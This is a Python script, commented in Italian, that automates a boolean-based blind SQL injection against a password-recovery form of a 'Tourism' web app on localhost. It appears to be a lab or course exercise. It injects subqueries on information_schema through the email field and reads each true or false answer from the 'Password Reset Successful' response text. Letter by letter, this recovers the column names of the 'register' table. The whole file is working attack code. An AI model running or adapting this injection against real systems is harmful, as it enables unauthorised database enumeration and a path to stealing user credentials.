import requests
import string


# Funzione che iterativamente aggiunge una lettera alla stringa
# termina la "riceraca" quando si accorge che non ci sono lettere da aggiungere
def rec_finder(url: str,base:str, index:int, early_stop = False):

    alphabet = string.ascii_lowercase  + string.digits + '_'
    found = 0
    res = []
    if early_stop:
        print(base)
        return base
    else:
        for letter in alphabet:
            payload = f"ivan@ivan.ez' AND (SELECT 1 FROM information_schema.columns WHERE table_schema = 'tourism' AND table_name = 'register' AND substring(column_name,1,{len(base)+1}) = '{base + letter}' limit 1); #"

            body_request = {
                'email' : payload,
                'password' : 'ivanez'
            }

            r = requests.post(url = url, data = body_request)
            
            if "Password Reset Successful" in r.text:
                new_base = base + letter
                new_index = index + 1
                found = 1
                rec_finder(url = url, base = new_base, index= new_index, early_stop=False) 

        # In case no letter is found
        if not found:
            rec_finder(url=url, base=base, index=index, early_stop=True)
                



def main():

    url = "http://localhost:8080/Tourism/Recover"

    alphabet = string.ascii_lowercase  + string.digits

    for letter in alphabet:
        
        payload = f"ivan@ivan.ez' AND (SELECT 1 FROM information_schema.columns WHERE table_schema = 'tourism' AND table_name = 'register' AND substring(column_name,1,1) = '{letter}') #"

        body_request = {
            'email' : payload,
            'password' : 'ivanez'
        }

        r = requests.post(url = url, data = body_request)
        
        if "Password Reset Successful" in r.text:
            new_base = letter
            new_index = 2
            rec_finder( url = url, base = new_base, index= new_index, early_stop=False )
        



if __name__ == "__main__":
    main()